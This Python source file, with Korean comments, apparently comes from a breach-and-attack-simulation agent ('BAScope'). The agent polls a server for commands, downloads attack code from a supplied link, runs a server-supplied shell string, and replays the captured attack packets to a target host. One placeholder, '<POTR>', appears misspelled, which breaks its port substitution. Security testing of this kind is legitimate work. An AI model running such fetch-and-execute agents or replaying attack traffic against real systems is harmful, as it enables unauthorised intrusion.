from network import utility, packet
import json
from time import sleep
import requests
from multiprocessing import Process, Queue
import subprocess


class Agent(object):
    def __init__(self, server):
        self.ip = utility.get_local_ip()
        self.server = server

    def run(self):
        url = self.server + self.path
        cmd = ''

        # 서버에 1초마다 반복적으로 요청을 날리고, type 이라는 문자가 들어간 응답이 있는 경우에 멈춤
        # 이 작업말고는 할 일이 없기 때문에, 멀티쓰레딩으로 구현하지 않음
        while True:
            cmd = requests.get(url).text

            if "type" in cmd:
                break
            sleep(1)

        cmd = json.loads(cmd)

        # json 형태의 cmd 를 처리하기 위한 객체
        cp = CommandProcessor(cmd)
        cp.run()

    def set_path(self, path):
        self.path = path

def cmd_after_replacement(usage, replacements):
    # Reference: https://stackoverflow.com/a/55889140
    [ usage := usage.replace(a, b) for a, b in replacements ]
    return usage

# 서버로부터 받은 명령을 처리하기 위한 클래스 (attack / defense)
class CommandProcessor(object):
    def __init__(self, cmd):
        self.cmd = cmd
        self.path = "tmp/ex.py"
        self.signature = b"BAScope"
    
    def run(self):
        cmd = self.cmd

        # 공격 agent 로 동작
        if cmd["type"] == "attack":
            localhost = "127.0.0.1"
            link = cmd['download']  # 공격 코드 다운로드 링크
            target_ip = cmd['target_ip']
            target_port = cmd['target_port']

            r = requests.get(link)

            # 다운로드 받은 공격코드를 임시 디렉토리에 저장함
            with open(self.path, "w") as f:
                f.write(r.text)
            
            # 공격코드를 localhost 로 보낼 것이기 때문에, 
            # 1. 해당 공격 패킷을 받고, 더미 응답을 보내줄 127.0.0.1:port 서버와
            # 2. loopback 어댑터에 대한 패킷 sniffer 와
            # 3. 공격코드 실행
            # 으로 총 3가지 프로세스를 동시에 실행해야 한다.
            # 공격코드가 10초 이내에는 종료될 것이라는 믿음하에, sniffer 는 디폴트로 10초 동안만 동작한다.
            # 공격코드가 10초 이상 걸리거나, send 사이의 간격이 2초 이상이라면 코드수정이 필요하다. 
            queue = Queue()

            lo_proxy = Process(target = utility.proxy, args=(target_port, ))
            lo_sniffer = Process(target = packet.local_sniffer, args=(target_port, queue))

            lo_sniffer.start()
            queue.get()     # sniff 가 켜지기까지 기다림.

            lo_proxy.start()
            # usage 에서 FILE, IP, PORT, SHELLCODE 가 필요한 경우, replace 를 통해 채워줌
            replacements = [
                ("<FILE>", self.path),
                ("<IP>", localhost),
                ("<POTR>", str(target_port))
            ]
            usage = cmd_after_replacement(cmd['usage'], replacements)
            subprocess.call(usage, shell=True)

            lo_proxy.join()
            lo_sniffer.join()
            msg_set = queue.get()
            msg_list = list(msg_set)

            # 모든 패킷에 시그니쳐를 붙임
            for i in range(len(msg_list)):
                msg_list[i] = msg_list[i] + self.signature
            
            packet.send_msg_with_ip(target_ip, target_port, msg_list)

        # 방어 agent 로 동작
        elif cmd["type"] == "defense":
            pass

        else:
            print("non implemented")
            exit(1)
